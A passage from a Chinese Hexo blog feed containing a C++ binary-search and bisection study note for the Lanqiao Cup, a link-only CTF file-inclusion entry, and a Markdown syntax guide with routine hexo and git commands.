        <content type="html"><![CDATA[<blockquote><p>二分查找,请注意边界,看懂题意要查找的到底是哪种满足答案的解!</p></blockquote><h3 id="Q1-什么是lower-bound-upper-bound">Q1:什么是lower_bound/upper_bound?</h3><p>这两个函数是STL中用于二分查找的两个函数，用法： 假定我们有一个有序的数组<em>a</em>，并将数<em>x</em>作为二分查找的目标，那么：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">lower_bound</span>(a,a+n,x)-a      <span class="comment">//下标从0开始</span></span><br><span class="line"><span class="built_in">lower_bound</span>(a+<span class="number">1</span>,a+n+<span class="number">1</span>,x)-a  <span class="comment">//下标从1开始</span></span><br></pre></td></tr></table></figure><p>这样就能取得最小的a数组下标i,满足a<sub>i</sub>&gt;=x</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">upper_bound</span>(a,a+n,x)-a      <span class="comment">//下标从0开始</span></span><br><span class="line"><span class="built_in">upper_bound</span>(a+<span class="number">1</span>,a+n+<span class="number">1</span>,x)-a  <span class="comment">//下标从1开始</span></span><br></pre></td></tr></table></figure><p>它们就能取得最小的<em>a</em>数组的下标<em>i</em>，满足a<sub>i</sub>&gt;x</p><p>手动实现查找</p><p><img src="https://s1.vika.cn/space/2024/04/06/40b30facd342415b8e1d2951c979e64e" alt=""></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">---------如何理解这两种搜索的区别呢,主要是while条件的不同</span></span><br><span class="line"><span class="comment">---------如果是搜具体的某个数(一般是直接搜到答案),也就是直接搜二分时mid的值,直接返回mid</span></span><br><span class="line"><span class="comment">---------但是如果不是搜具体的某个数,而是搜索一段区间,即返回的不是mid而是left或right这种边界</span></span><br><span class="line"><span class="comment">---------那么此时返回的状态其实是最后一次搜索结果的前一个(或者几个)状态 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">---------如何理解这个left+1&lt;right</span></span><br><span class="line"><span class="comment">-----这里的&#x27;1&#x27;可以表示left和right之间相差多少时退出循环!</span></span><br><span class="line"><span class="comment">-----除了搜最后一次外可以while退出时写等号,其他时候维护距离不能写=!</span></span><br><span class="line"><span class="comment">-----这里的传参传的是有效数组的后一位,如果刚好传有效数组那么长,搜不到当解是最后一个的情况</span></span><br><span class="line"><span class="comment">-----因此尽量开大一点点数组</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check1</span><span class="params">(<span class="type">int</span> index,<span class="type">int</span> tar)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index &lt; tar)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check2</span><span class="params">(<span class="type">int</span> index,<span class="type">int</span> tar)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index &gt; tar)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binasearch_lower</span><span class="params">(<span class="type">int</span> n[],<span class="type">int</span> size,<span class="type">int</span> tar)</span></span>&#123;</span><br><span class="line">    <span class="comment">//0 1 | 3, 3, 3, 5, 7</span></span><br><span class="line">    <span class="comment">//看这个分界线</span></span><br><span class="line">    <span class="type">int</span> left=<span class="number">0</span>,right=size;</span><br><span class="line">    <span class="keyword">while</span> (left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line">        <span class="type">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check1</span>(n[mid],tar))&#123;</span><br><span class="line">            left=mid;</span><br><span class="line">        &#125;<span class="keyword">else</span> right=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n[right]==tar)<span class="keyword">return</span> right;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binasearch_upper</span><span class="params">(<span class="type">int</span> n[],<span class="type">int</span> size,<span class="type">int</span> tar)</span></span>&#123;</span><br><span class="line">    <span class="comment">//1 , 3, 3, 3,| 5, 7</span></span><br><span class="line">    <span class="comment">//看这个分界线</span></span><br><span class="line">    <span class="type">int</span> left=<span class="number">0</span>,right=size;</span><br><span class="line">    <span class="keyword">while</span> (left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line">        <span class="type">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check2</span>(n[mid],tar))&#123;</span><br><span class="line">            right=mid;</span><br><span class="line">        &#125;<span class="keyword">else</span> left=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n[left]==tar)<span class="keyword">return</span> left;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// return 0;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">testsearch</span><span class="params">(<span class="type">int</span> n[],<span class="type">int</span> size,<span class="type">int</span> tar)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> l=<span class="number">0</span>,r=size;</span><br><span class="line">    <span class="keyword">while</span>(l+<span class="number">0</span>&lt;=r)&#123;</span><br><span class="line">        <span class="type">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(n[mid]==tar)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(n[mid]&gt;tar)r=mid<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span> l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">12</span>]=&#123;<span class="number">0</span>,<span class="number">1</span> ,<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>&#125;;</span><br><span class="line">    <span class="type">int</span> b[<span class="number">8</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">binasearch_lower</span>(a,<span class="number">12</span>,<span class="number">9</span>)&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;<span class="built_in">binasearch_upper</span>(a,<span class="number">12</span>,<span class="number">9</span>)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">testsearch</span>(b,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>零点判定定理求根:<a href="https://www.luogu.com.cn/problem/P1024">一元三次方程求根</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std ;</span><br><span class="line"><span class="type">double</span> a,b,c,d;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">double</span> l,<span class="type">double</span> r)</span></span>&#123;</span><br><span class="line">    <span class="comment">//maybe is 零点存在定理</span></span><br><span class="line">    <span class="comment">//0.01 0.02 0.03 x 0.04 0.05 0.06</span></span><br><span class="line">    <span class="keyword">if</span>( (a*l*l*l + b*l*l + c*l + d)*(a*r*r*r+b*r*r+c*r+d)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">cal</span><span class="params">(<span class="type">double</span> l)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a*l*l*l + b*l*l + c*l + d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c&gt;&gt;d;</span><br><span class="line">    <span class="type">double</span> l=<span class="number">-100</span>,r=<span class="number">100</span>;</span><br><span class="line">    <span class="type">int</span> cnt=<span class="number">0</span>;<span class="comment">//找到3个解直接退出</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">-100</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">    l=i;</span><br><span class="line">    r=i+<span class="number">1</span>;</span><br><span class="line">    <span class="type">double</span> r1=<span class="built_in">cal</span>(l),r2=<span class="built_in">cal</span>(r);</span><br><span class="line">    <span class="keyword">if</span>(!r1)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2lf &quot;</span>,l);</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">double</span> mid;</span><br><span class="line">    <span class="keyword">if</span>(r1*r2&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">     <span class="keyword">while</span>(r-l&gt;=<span class="number">0.001</span>)&#123;</span><br><span class="line">        mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">cal</span>(mid)*<span class="built_in">cal</span>(r)&lt;=<span class="number">0</span>)l=mid;</span><br><span class="line">        <span class="keyword">else</span> r=mid; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf &quot;</span>,mid);</span><br><span class="line">    cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==<span class="number">3</span>)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行l,r端点枚举时,判断具体循环结束的条件时要进行<code>check</code>,建议自己草稿纸画图模拟下较好!</p><h3 id="总结一下用处">总结一下用处</h3><hr><ul><li>二分查找数字(最基础)</li><li>二分求精度(进阶)</li><li>二分求一些很奇怪的方程的根(零点判定定理+锁精度)</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 蓝桥杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二开文件包含(伪协议)</title>
      <link href="/posts/e4f17bd5.html"/>
      <url>/posts/e4f17bd5.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">https://blog.csdn.net/qq_44657899/article/details/109300335</a></p><p><a href="https://blog.csdn.net/qq_62794597/article/details/127806447">题目:泰山杯</a></p>]]></content>
      
      
      <categories>
          
          <category> 文件包含&amp;&amp;伪协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法与外挂标签写法汇总</title>
      <link href="/posts/2013454d.html"/>
      <url>/posts/2013454d.html</url>
      
        <content type="html"><![CDATA[<h1>1.Markdown语法自带格式</h1><div class="note info flat"><p>参考：<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a></p></div><div class="note warning flat"><p>注意：此页面偶尔会存在CSS冲突问题!</p></div><h2 id="1-1-代码块">1.1 代码块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-2-多级标题">1.2 多级标题</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>见本文章标题!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-3-文字样式">1.3 文字样式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>这里的背景色是：MistyRosen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<s>删除</s>线演示</p><p><font size = 5>5号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>上述要点可参考:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">【Markdown语法】字体颜色大小及文字底色设置</a></p></div><h2 id="1-4-引用">1.4 引用</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>Java<br>二级引用演示<br>MySQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>(引用内部一样可以用格式)</p></blockquote><p>…</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-5-分割线">1.5 分割线</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><hr><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-6-列表-跟空格都可以">1.6 列表(*,+,-跟空格都可以)</h2><h3 id="1-6-1-无序列表">1.6.1 无序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-6-2-有序列表">1.6.2 有序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 注意后面有空格</span></span><br><span class="line"><span class="bullet">1.</span> </span><br><span class="line"><span class="bullet">2.</span> </span><br><span class="line"><span class="bullet">3.</span> </span><br><span class="line"><span class="bullet">4.</span> </span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li></li><li></li><li></li><li></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-7-图片">1.7 图片</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 本地图片</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># 在线图片</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>本地图片:<br><img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /><br>在线图片:<br><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-8-表格">1.8 表格</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 项目标号 | 资金     | 备注 |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100，000 | 无   |</span><br><span class="line">| 2        | 200，000 | 无   |</span><br><span class="line">| 3        | 300,600  | 重要 |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" 